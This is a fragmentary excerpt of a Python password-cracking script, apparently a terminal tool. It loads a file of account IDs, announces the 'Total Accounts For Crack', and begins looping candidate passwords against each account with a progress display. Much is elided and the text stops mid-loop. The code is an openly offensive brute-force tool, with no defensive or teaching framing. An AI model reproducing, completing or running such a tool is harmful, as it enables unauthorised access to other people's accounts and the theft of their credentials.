...
def lin3():
   print('\33[2;32m______________ASDF______________')
def exit():
  sys.exit()
...
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}𝗘𝗻𝘁𝗲𝗿 𝗙𝗶𝗹𝗲: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}𝗙𝗶𝗹𝗲 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱");time.sleep(1)
        main_menu() 
    method()
    exit()
...
--------------"""
       ...
       main_menu()
    clear() 
    print('\033[1;97m[+] 𝗧𝗼𝘁𝗮𝗹 𝗔𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗙𝗼𝗿 𝗖𝗿𝗮𝗖𝗸 : \033[1;32m '+str(len(idx)))
    ...
    def start(user):
     try:
        ...
        sys.stdout.write(f'\r {R}[{W}ASDF{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
